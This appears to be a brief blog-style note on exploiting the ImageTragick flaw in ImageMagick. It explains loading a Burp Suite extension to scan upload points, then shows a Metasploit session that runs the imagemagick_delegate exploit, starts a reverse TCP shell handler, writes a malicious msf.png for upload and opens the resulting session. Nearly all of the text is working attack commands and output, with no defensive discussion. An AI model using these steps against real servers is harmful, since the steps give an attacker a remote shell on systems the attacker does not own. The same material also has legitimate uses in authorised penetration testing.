---
title: ImageTragick using BurpSuite and Metasploit
date: 2016-05-26 14:13:16
tags: BurpSuite,ImageTragick
---

### BurpSuite
1. Download [burp-image-size.jar](https://github.com/silentsignal/burp-image-size/releases)
2. BurpSuite >> Extender >> Extensions >> Add >> select burp-image-size.jar
3. using burpsuite to scan upload point

### Metasploit

```
> msfconsole
msf> use exploit/unix/fileformat/imagemagick_delegate
msf> set LPORT 8080
msf> exploit -j
msf exploit(imagemagick_delegate) > exploit -j
[*] Exploit running as background job.
[*] Started reverse TCP handler on 10.0.5.41:8080
msf exploit(imagemagick_delegate) > [+] msf.png stored at /Users/xl7dev/.msf4/local/msf.png
msf exploit(imagemagick_delegate) > session -i 1
```
